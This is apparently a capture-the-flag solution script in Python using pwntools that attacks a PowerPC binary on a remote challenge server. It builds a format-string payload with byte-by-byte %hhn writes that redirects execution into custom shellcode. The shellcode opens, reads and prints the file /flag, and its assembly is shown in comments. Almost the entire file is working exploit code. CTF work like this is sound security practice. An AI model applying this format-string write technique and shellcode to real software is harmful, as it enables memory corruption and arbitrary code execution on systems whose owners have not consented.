#First Blood
from pwn import *

context.log_level="debug"
context.endian="big"
#p=process(["qemu-ppc","-g","1234","./pwn22"])
p=remote("150.158.156.120",23333)
p.recvuntil("launch......\n")
#0x100a01e0  0x100a0200  
#01 02
'''
addi r9,r1,0x27c4
mtctr     r9
bctrl
'''
s="9!'\xd0})\x03\xa6N\x80\x04!"
ans={}
addr=0x100a0200
for i in range(len(s)):
   ans[addr+i]=ord(s[i])

s=p32(0x100a0200)+p32(0x100a01f4-0x1c)
addr=0x100a01f4
for i in range(len(s)):
   ans[addr+i]=ord(s[i])

payload=""
addrs=""
last=0
num=49+13-1
for i in range(256):
   for j in ans:
       if ans[j]==i:
            num+=1
            if i-last==0:
                payload+="%"+str(num)+"$hhn"
                addrs+=p32(j)
            else:
                payload+="%"+str(i-last)+"c"+"%"+str(num)+"$hhn"
                addrs+=p32(j)
                last=i
payload=(payload+"aa"+addrs).encode("hex")
'''
addi 3,1,0x2818
li 0,5
li 4,0
sc
nop
li 0,3
addi 4,1,0
li 5,50
sc
nop
nop
li 0,4
li 3,1
addi 4,1,0
li 5,50
sc
nop
nop
'''
shell='8a(\x188\x00\x00\x058\x80\x00\x00D\x00\x00\x02`\x00\x00\x008\x00\x00\x038\x81\x00\x008\xa0\x002D\x00\x00\x02`\x00\x00\x00`\x00\x00\x008\x00\x00\x048`\x00\x018\x81\x00\x008\xa0\x002D\x00\x00\x02`\x00\x00\x00`\x00\x00\x00'+"/flag"
p.send(payload.decode("hex")+shell)
p.interactive()
